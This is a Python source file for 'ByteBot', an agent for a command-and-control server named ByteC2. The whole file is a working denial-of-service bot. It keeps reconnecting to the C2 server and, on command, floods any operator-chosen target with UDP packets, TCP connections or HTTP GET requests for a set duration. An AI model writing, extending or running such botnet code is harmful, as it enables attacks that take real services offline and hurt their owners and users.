#!/usr/bin/env python3
# ByteBot - Modern Agent for ByteC2
# Author: Anonymous

import socket
import threading
import time
import random
import sys
import os

class ByteBot:
    def __init__(self, c2_ip, c2_port):
        self.c2_ip = c2_ip
        self.c2_port = c2_port
        self.running = True
        self.attack_thread = None
        self.stop_attack = False
        self.session_id = os.urandom(4).hex()  # ID único para cada bot
        
        # Configuración de ataques
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-G980F) AppleWebKit/537.36"
        ]
        
    def connect_to_c2(self):
        while self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.connect((self.c2_ip, self.c2_port))
                    sock.send(f"CONNECT|{self.session_id}".encode())
                    self.handle_commands(sock)
            except Exception as e:
                print(f"[!] Connection error: {str(e)}")
                time.sleep(10)  # Espera antes de reconectar

    def handle_commands(self, sock):
        try:
            while self.running:
                data = sock.recv(1024).decode().strip()
                if not data:
                    break
                    
                if data == "PING":
                    sock.send("PONG".encode())
                elif data.startswith("ATTACK"):
                    self.execute_attack(data)
                else:
                    print(f"[*] Command received: {data}")
                    
        except Exception as e:
            print(f"[!] Command error: {str(e)}")

    def execute_attack(self, command):
        parts = command.split('|')
        if len(parts) < 5:
            return
            
        _, method, target, port, duration = parts[0], parts[1], parts[2], int(parts[3]), int(parts[4])
        self.stop_attack = False
        
        if method == "UDP":
            self.attack_thread = threading.Thread(
                target=self.udp_flood,
                args=(target, port, duration),
                daemon=True
            )
        elif method == "TCP":
            self.attack_thread = threading.Thread(
                target=self.tcp_flood,
                args=(target, port, duration),
                daemon=True
            )
        elif method == "HTTP":
            path = parts[5] if len(parts) > 5 else "/"
            self.attack_thread = threading.Thread(
                target=self.http_flood,
                args=(target, port, duration, path),
                daemon=True
            )
            
        self.attack_thread.start()

    def udp_flood(self, ip, port, duration):
        end_time = time.time() + duration
        while time.time() < end_time and not self.stop_attack:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.sendto(random._urandom(1024), (ip, port))
            except:
                pass
            time.sleep(0.01)

    def tcp_flood(self, ip, port, duration):
        end_time = time.time() + duration
        while time.time() < end_time and not self.stop_attack:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    s.connect((ip, port))
                    s.close()
            except:
                pass
            time.sleep(0.01)

    def http_flood(self, ip, port, duration, path="/"):
        end_time = time.time() + duration
        headers = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(self.user_agents)}\r\n\r\n"
        
        while time.time() < end_time and not self.stop_attack:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    s.connect((ip, port))
                    s.send(headers.encode())
                    s.close()
            except:
                pass
            time.sleep(0.1)

    def start(self):
        print(f"""
         ____        _   _       ____        _   
        | __ ) _   _| |_| |__   | __ )  ___ | |_ 
        |  _ \| | | | __| '_ \  |  _ \ / _ \| __|
        | |_) | |_| | |_| | | | | |_) | (_) | |_ 
        |____/ \__, |\__|_| |_| |____/ \___/ \__|
               |___/                              
        """)
        print(f"[*] Connecting to C2 at {self.c2_ip}:{self.c2_port}")
        self.connect_to_c2()

if __name__ == '__main__':
    # Configuración (cambiar según necesidad)
    C2_IP = "127.0.0.1"  # IP de tu servidor ByteC2
    C2_PORT = 4444        # Puerto del ByteC2
    
    bot = ByteBot(C2_IP, C2_PORT)
    bot.start()
